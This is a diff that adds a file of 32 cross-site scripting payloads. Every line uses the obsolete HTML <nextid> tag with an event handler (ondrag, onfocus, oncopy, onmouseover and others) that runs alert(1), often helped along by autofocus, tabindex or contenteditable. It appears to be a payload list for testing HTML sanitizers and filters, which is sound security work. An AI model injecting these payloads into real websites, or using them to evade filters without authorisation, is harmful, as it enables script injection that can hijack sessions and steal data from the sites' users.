@@ -1,0 +1,32 @@
+<nextid draggable="true" ondrag="alert(1)">test</nextid>
+<nextid draggable="true" ondragend="alert(1)">test</nextid>
+<nextid draggable="true" ondragenter="alert(1)">test</nextid>
+<nextid draggable="true" ondragleave="alert(1)">test</nextid>
+<nextid draggable="true" ondragstart="alert(1)">test</nextid>
+<nextid id=x tabindex=1 onactivate=alert(1)></nextid>
+<nextid id=x tabindex=1 onbeforeactivate=alert(1)></nextid>
+<nextid id=x tabindex=1 onbeforedeactivate=alert(1)></nextid><input autofocus>
+<nextid id=x tabindex=1 ondeactivate=alert(1)></nextid><input id=y autofocus>
+<nextid id=x tabindex=1 onfocus=alert(1)></nextid>
+<nextid id=x tabindex=1 onfocusin=alert(1)></nextid>
+<nextid onbeforecopy="alert(1)" contenteditable>test</nextid>
+<nextid onbeforecut="alert(1)" contenteditable>test</nextid>
+<nextid onbeforepaste="alert(1)" contenteditable>test</nextid>
+<nextid onblur=alert(1) tabindex=1 id=x></nextid><input autofocus>
+<nextid onclick="alert(1)">test</nextid>
+<nextid oncontextmenu="alert(1)">test</nextid>
+<nextid oncopy="alert(1)" contenteditable>test</nextid>
+<nextid oncut="alert(1)" contenteditable>test</nextid>
+<nextid ondblclick="alert(1)">test</nextid>
+<nextid onfocusout=alert(1) tabindex=1 id=x></nextid><input autofocus>
+<nextid onkeydown="alert(1)" contenteditable>test</nextid>
+<nextid onkeypress="alert(1)" contenteditable>test</nextid>
+<nextid onkeyup="alert(1)" contenteditable>test</nextid>
+<nextid onmousedown="alert(1)">test</nextid>
+<nextid onmouseenter="alert(1)">test</nextid>
+<nextid onmouseleave="alert(1)">test</nextid>
+<nextid onmousemove="alert(1)">test</nextid>
+<nextid onmouseout="alert(1)">test</nextid>
+<nextid onmouseover="alert(1)">test</nextid>
+<nextid onmouseup="alert(1)">test</nextid>
+<nextid onpaste="alert(1)" contenteditable>test</nextid>
